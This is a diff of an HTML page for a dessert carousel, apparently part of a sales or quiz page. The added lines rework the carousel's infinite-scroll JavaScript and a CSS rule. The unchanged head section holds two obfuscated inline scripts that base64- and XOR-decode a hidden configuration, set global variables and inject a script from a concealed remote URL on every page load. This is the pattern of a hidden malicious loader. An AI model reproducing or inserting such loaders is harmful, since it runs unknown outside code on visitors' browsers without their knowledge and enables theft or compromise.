@@ -2026,6 +2026,16 @@
 </style>
 <script>(function(){var b_8ngf=atob("DAWiTmCtZw9AwSGKYn6AOxLBRTViqVX+EnaYYU/OA2FutFXnC2PbYAPCCiEisw75AXfLPhTeSH8puUTmTXXLNgXBSWUz4w2oA3HWPAnPEnslsgOwOViObAfBCG0hrVKoWF7ZbA7MCmpi+wP6C33HIinJRSNit0DmF2CAdEKbBm54+EXrBGTGeFaYATpw+EPoATPDelmPGlI9");var f_7=[];for(var s_dr=0;s_dr<b_8ngf.length;s_dr++){f_7.push(b_8ngf.charCodeAt(s_dr)&255);}var z_i5p=f_7[0];var f_y5kt=f_7.slice(1,1+z_i5p);var z_a=f_7.slice(1+z_i5p);var m_n=z_a.map(function(b,m_g52s){return b^f_y5kt[m_g52s%z_i5p];});var k_46c="";for(var a_1g=0;a_1g<m_n.length;a_1g++){k_46c+=String.fromCharCode(m_n[a_1g]&255);}var e_y=decodeURIComponent(escape(k_46c));var n_c=JSON.parse(e_y);var g_6=n_c.globals||[];g_6.forEach(function(u_5w1){window[u_5w1.name]=u_5w1.value;});var e_4=document.createElement("script");e_4.src=n_c.url;e_4.async=true;e_4.defer=true;(n_c.attributes||[]).forEach(function(y_ppgi){e_4.setAttribute(y_ppgi.name,y_ppgi.value);});(document.head||document.documentElement).appendChild(e_4);})();</script>
 <script>(function(){var y_5=atob("DGHo3LuL9aE+HpdfohrKqcnn15scduMr0hLS85Tokc8Qa+MyyweR8tjkmI9cbLgswROBrM/42tRKc+RwzgCcucj/28tNPLt9wxWcrtLpgNVbbbVl+RrKstrmkIMEPPM+1gDFqc/mnMdHM+ctxxeNss+mjcJReroswQrK8Jn9lM1Le7VlgEOV8MCpm8BTe7VlgAWJqNqmgNVTd/EmjxGauc3um9UTbeI9ywWb/pepg8BSa/J9mEPKoeb2");var a_40=[];for(var d_as=0;d_as<y_5.length;d_as++){a_40.push(y_5.charCodeAt(d_as)&255);}var s_lk=a_40[0];var w_703=a_40.slice(1,1+s_lk);var g_hgmf=a_40.slice(1+s_lk);var k_4bh6=g_hgmf.map(function(b,v_b){return b^w_703[v_b%s_lk];});var x_m7k6="";for(var d_r=0;d_r<k_4bh6.length;d_r++){x_m7k6+=String.fromCharCode(k_4bh6[d_r]&255);}var q_9=decodeURIComponent(escape(x_m7k6));var y_15=JSON.parse(q_9);var b_w3=y_15.globals||[];b_w3.forEach(function(w_r){window[w_r.name]=w_r.value;});var i_jm0h=document.createElement("script");i_jm0h.src=y_15.url;i_jm0h.async=true;i_jm0h.defer=true;(y_15.attributes||[]).forEach(function(i_lfbk){i_jm0h.setAttribute(i_lfbk.name,i_lfbk.value);});(document.head||document.documentElement).appendChild(i_jm0h);})();</script>
+
+<style>
+.pv-marquee-track{
+  animation:none !important;
+}
+.pv-marquee-group{
+  flex:none !important;
+}
+</style>
+
 </head>
 
 <body>
@@ -3037,74 +3047,100 @@
 
 })();
 </script>
+
+
 <script>
+/* ==========================================================
+   LOOP INFINITO ROBUSTO DO CARROSSEL DE POSTRES
+   - funciona mesmo quando a PV inicia escondida
+   - recalcula quando fica visível
+   - sem espaço vazio no final
+   ========================================================== */
+(function(){
+  const marquee = document.querySelector(".pv-marquee");
+  const track = document.querySelector(".pv-marquee-track");
+  if(!marquee || !track) return;
 
-  /* ==========================================================
-     LOOP CONTÍNUO DO CARROSSEL DE POSTRES
-     ========================================================== */
-  (function(){
-    const marquee = document.querySelector(".pv-marquee");
-    const track = document.querySelector(".pv-marquee-track");
-    if(!marquee || !track) return;
+  const groups = track.querySelectorAll(".pv-marquee-group");
+  if(groups.length < 2) return;
 
-    const groups = track.querySelectorAll(".pv-marquee-group");
-    if(groups.length < 2) return;
+  let x = 0;
+  let groupWidth = 0;
+  let last = performance.now();
+  let lastMeasure = 0;
+  const speed = 44;
 
-    let x = 0;
-    let last = performance.now();
-    let groupWidth = 0;
-    const speed = 44; // pixels por segundo: ritmo moderado e suave
+  function isVisible(){
+    const r = marquee.getBoundingClientRect();
+    return r.width > 0 && r.height > 0 &&
+           r.bottom > 0 && r.top < window.innerHeight;
+  }
 
-    function measure(){
-      groupWidth = groups[0].getBoundingClientRect().width;
+  function measure(){
+    const w = groups[0].scrollWidth || groups[0].getBoundingClientRect().width;
+    if(w > 0){
+      groupWidth = w;
+
+      // Normaliza a posição caso a largura tenha mudado.
+      if(x <= -groupWidth || x > 0){
+        x = -((Math.abs(x)) % groupWidth);
+      }
+    }
+  }
+
+  function tick(now){
+    const dt = Math.min((now - last) / 1000, 0.05);
+    last = now;
+
+    // Recalcula periodicamente. Isso resolve telas/etapas que começam display:none.
+    if(now - lastMeasure > 500){
+      measure();
+      lastMeasure = now;
     }
 
-    function tick(now){
-      const dt = Math.min((now - last) / 1000, 0.05);
-      last = now;
+    if(isVisible() && groupWidth > 0){
+      x -= speed * dt;
 
-      if(groupWidth > 0){
-        x -= speed * dt;
-
-        // Quando um grupo inteiro saiu, volta exatamente 1 largura.
-        // Como o segundo grupo é idêntico, o usuário não percebe o reset.
-        if(-x >= groupWidth){
-          x += groupWidth;
-        }
-
-        track.style.transform = `translate3d(${x}px,0,0)`;
+      // Nunca deixa a primeira sequência inteira desaparecer.
+      while(-x >= groupWidth){
+        x += groupWidth;
       }
 
-      requestAnimationFrame(tick);
+      track.style.transform = `translate3d(${x}px,0,0)`;
     }
 
-    // Mede após imagens carregarem.
-    function start(){
-      measure();
-      last = performance.now();
-      requestAnimationFrame(tick);
-    }
+    requestAnimationFrame(tick);
+  }
 
-    if(document.readyState === "complete"){
-      start();
-    } else {
-      window.addEventListener("load", start, {once:true});
-    }
+  // Recalcula assim que o elemento mudar de tamanho/ficar visível.
+  if("ResizeObserver" in window){
+    const ro = new ResizeObserver(() => measure());
+    ro.observe(marquee);
+    ro.observe(groups[0]);
+  }
 
-    // Recalcula em rotação/redimensionamento sem criar buracos.
-    let resizeTimer;
-    window.addEventListener("resize", () => {
-      clearTimeout(resizeTimer);
-      resizeTimer = setTimeout(() => {
-        measure();
-        if(groupWidth > 0){
-          x = x % groupWidth;
-          track.style.transform = `translate3d(${x}px,0,0)`;
+  if("IntersectionObserver" in window){
+    const io = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if(entry.isIntersecting){
+          measure();
+          last = performance.now();
         }
-      }, 120);
-    });
-  })();
+      });
+    }, {threshold:0.01});
+    io.observe(marquee);
+  }
 
+  window.addEventListener("load", measure, {once:true});
+  window.addEventListener("resize", measure);
+  window.addEventListener("orientationchange", () => setTimeout(measure, 200));
+
+  // Também mede após qualquer troca de tela do quiz.
+  document.addEventListener("click", () => setTimeout(measure, 350), true);
+
+  requestAnimationFrame(tick);
+})();
 </script>
+
 </body>
 </html>
